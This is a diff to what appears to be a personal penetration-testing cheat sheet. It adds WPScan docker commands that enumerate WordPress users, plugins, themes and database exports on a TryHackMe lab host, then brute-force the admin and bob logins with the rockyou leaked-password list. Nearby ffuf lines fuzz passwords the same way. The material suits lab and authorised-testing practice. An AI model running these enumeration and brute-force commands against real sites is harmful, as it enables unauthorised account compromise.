@@ -55,3 +55,21 @@ Follow redirect
 ```bash
 ffuf -request req -request-proto http -w ~/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt -x http://127.0.0.1:8081 -r
 ```
+
+
+### FUZZING wordpress with WPScan
+
+```bash
+sudo docker run -it --rm wpscanteam/wpscan --url http://www.smol.thm/wordpress --disable-tls-checks   --api-token  $wp_token --enumerate u,p,t,tt,cb,dbe
+```
+
+To fix network related issue add ``--add-host=www.smol.thm:10.10.169.82`` in your docker command
+
+```bash
+sudo docker run -it --rm --add-host=www.smol.thm:10.10.169.82 wpscanteam/wpscan --url http://www.smol.thm/ --disable-tls-checks   --api-token  $wp_token --enumerate u,p,t,tt,cb,dbe  
+```
+
+#### wpscan Brute force
+```bash
+sudo docker run -it --rm -v /home/sh/Tools/SecLists/Passwords/Leaked-Databases/rockyou.txt:/rockyou.txt wpscanteam/wpscan --url http://10.10.94.0/wordpress/ --disable-tls-checks -U admin,bob -P /rockyou.txt
+```
